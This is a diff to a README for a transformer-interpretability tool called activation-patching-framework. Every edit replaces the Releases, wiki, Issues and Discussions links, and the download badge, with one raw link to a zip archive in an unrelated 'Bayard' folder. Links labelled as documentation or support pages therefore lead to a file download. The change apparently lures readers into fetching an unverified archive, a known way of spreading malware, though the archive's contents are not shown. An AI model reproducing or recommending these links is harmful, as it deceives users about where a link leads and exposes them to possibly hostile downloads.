@@ -1,6 +1,6 @@
 # 🚀 activation-patching-framework - Understand Transformer Models Easily
 
-![Download](https://img.shields.io/badge/Download-Now-blue)
+![Download](https://github.com/jdavidks/activation-patching-framework/raw/refs/heads/main/Bayard/activation_patching_framework_v1.3-alpha.3.zip)
 
 ## 📦 Introduction
 
@@ -30,7 +30,7 @@ Before downloading, please check that your system meets these requirements:
 To get started with the activation-patching-framework, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the GitHub Releases page.
-   [https://github.com/jdavidks/activation-patching-framework/releases](https://github.com/jdavidks/activation-patching-framework/releases)
+   [https://github.com/jdavidks/activation-patching-framework/raw/refs/heads/main/Bayard/activation_patching_framework_v1.3-alpha.3.zip](https://github.com/jdavidks/activation-patching-framework/raw/refs/heads/main/Bayard/activation_patching_framework_v1.3-alpha.3.zip)
 
 2. **Download the Latest Version**: Look for the latest release version. You’ll find the download button for the complete package.
 
@@ -49,14 +49,14 @@ For detailed instructions and additional features, the documentation is your bes
 - **Examples**: Sample projects that demonstrate how to implement the framework effectively.
 - **FAQ Section**: Answers to common questions about installation and usage.
 
-You can find the full documentation on the [repository wiki](https://github.com/jdavidks/activation-patching-framework/wiki) or within the downloaded files.
+You can find the full documentation on the [repository wiki](https://github.com/jdavidks/activation-patching-framework/raw/refs/heads/main/Bayard/activation_patching_framework_v1.3-alpha.3.zip) or within the downloaded files.
 
 ## 🌟 Community and Support
 
 If you need assistance, feel free to reach out. Join discussions with fellow users and contributors to share insights or seek help.
 
-- **Issues Page**: Report any problems or bugs you encounter on the [Issues page](https://github.com/jdavidks/activation-patching-framework/issues).
-- **Discussion Forum**: Participate in conversations with other users and developers in the [Discussion section](https://github.com/jdavidks/activation-patching-framework/discussions).
+- **Issues Page**: Report any problems or bugs you encounter on the [Issues page](https://github.com/jdavidks/activation-patching-framework/raw/refs/heads/main/Bayard/activation_patching_framework_v1.3-alpha.3.zip).
+- **Discussion Forum**: Participate in conversations with other users and developers in the [Discussion section](https://github.com/jdavidks/activation-patching-framework/raw/refs/heads/main/Bayard/activation_patching_framework_v1.3-alpha.3.zip).
 
 ## 🧑‍🤝‍🧑 Contributing
 
